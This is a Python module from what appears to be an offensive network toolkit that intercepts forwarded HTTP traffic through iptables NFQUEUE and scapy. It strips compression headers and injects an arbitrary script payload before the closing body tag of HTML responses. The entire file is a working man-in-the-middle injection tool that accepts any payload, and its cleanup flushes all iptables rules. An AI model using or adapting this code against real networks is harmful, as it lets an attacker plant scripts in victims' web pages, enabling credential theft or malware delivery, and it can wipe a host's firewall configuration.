#!/usr/bin/env python3
import re
import subprocess
from core.banner import info, success, warn, error
from core.checker import check_root

def set_load(scapy, packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def run(args):
    check_root(exit_on_failure=True)
    payload = args.payload or "<script>alert('Security Audit: XSS Injected');</script>"
    queue_num = args.queue_num if args.queue_num is not None else 0
    try:
        import netfilterqueue
        import scapy.all as scapy
    except ImportError as e:
        error(f'Missing dependency: {e}')
        error('Install via: sudo apt install libnetfilter-queue-dev && pip install netfilterqueue scapy')
        return 1
    info(f'Preparing HTTP code injection on NFQUEUE {queue_num}...')
    info(f'Injection payload: {payload}')
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', str(queue_num)])
    success('iptables NFQUEUE rule established.')

    def process_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
            try:
                load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
                if scapy_packet[scapy.TCP].dport == 80:
                    load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
                    new_pkt = set_load(scapy, scapy_packet, load.encode('utf-8'))
                    packet.set_payload(bytes(new_pkt))
                elif scapy_packet[scapy.TCP].sport == 80:
                    if '</body>' in load:
                        load = load.replace('</body>', payload + '</body>')
                        content_length_search = re.search('Content-Length:\\s*(\\d+)', load, re.IGNORECASE)
                        if content_length_search and 'text/html' in load:
                            content_length = int(content_length_search.group(1))
                            new_length = content_length + len(payload)
                            load = re.sub('Content-Length:\\s*\\d+', f'Content-Length: {new_length}', load)
                        info(f'Payload successfully injected into HTTP response for {scapy_packet[scapy.IP].dst}')
                        new_pkt = set_load(scapy, scapy_packet, load.encode('utf-8'))
                        packet.set_payload(bytes(new_pkt))
            except Exception:
                pass
        packet.accept()
    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(queue_num, process_packet)
        info('Listening for HTTP traffic... Press Ctrl+C to terminate.')
        queue.run()
    except KeyboardInterrupt:
        info('\nStopping Code Injector...')
    finally:
        warn('Flushing iptables...')
        subprocess.call(['iptables', '--flush'])
    return 0
